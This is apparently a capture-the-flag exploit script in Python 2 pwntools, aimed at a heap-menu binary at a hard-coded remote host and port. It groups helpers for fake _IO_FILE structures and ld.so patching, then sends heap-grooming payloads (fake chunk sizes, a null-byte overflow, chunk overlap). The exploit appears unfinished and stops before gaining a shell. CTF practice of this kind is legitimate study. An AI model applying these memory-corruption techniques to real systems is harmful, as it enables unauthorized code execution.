from pwn import *
from ctypes import *
import os
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import struct
#import roputils as rop

remote_addr = "47.112.115.30"
remote_port = 13337

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 0
atta = 1

pc = './pwn'
pwn_elf = ELF(pc)

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
    print "haha2"
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): 
            	os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    print path
    return ELF(path)


def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct


if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
  if haslibc:
    #print "haha"
    #elf = change_ld('./two_heap', './ld.so')
    p = process(pc,env={'LD_PRELOAD':'./libc.so.6'}) 
    #p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
  else:
  	p = process(pc)
elif local == 0:
  p = remote(remote_addr,remote_port)
  if haslibc:
  	libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		#gdb.attach(p,'b *0x00000000001142F6 + 0x555555554000\n b*0x00000000001147D2 + 0x555555554000\n b*0x000000000011432B+0x555555554000')
		#gdb.attach(p,'b *0x00000000001147A3+0x555555554000\n b*0x00000000001147B5+0x555555554000')
		gdb.attach(p,'b *0x555555554000+0x0000000000001120')


def sla(a,b):
    p.sendlineafter(a,b)

def sa(a,b):
    p.sendafter(a,b)

def ru(a):
    return p.recvuntil(a)

def rl():
    return p.recvline()

def rv(a):
    return p.recv(a)

def sn(a):
    p.send(a)

def sl(a):
    p.sendline(a)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def add(size):
    sla('>>','1')
    sla('size : ',str(size))

def delete(idx):
    sla('>>','2')
    sla('idx : ',str(idx))

def edit(idx,content):
    sla('>>','3')
    sla('idx : ',str(idx))
    sa('text : ',content)

def hack():
    raw_input()
    add(0x28) #0
    add(0x210)  #1
    add(0x88) #2
    add(0x20) #3
    payload = (p64(0x200) + p64(0x20))*0x21
    edit(1,payload[:-1]+'\n')
    delete(1)
    payload = '\x00'*0x28
    edit(0,payload)
    add(0x90) #1
    add(0x90) #4
    add(0xb0) #5
    delete(1)
    delete(2)
    add(0x90) #1
    #payload = p64(0) + p64()
    #edit(4,payload)
    p.interactive()
hack()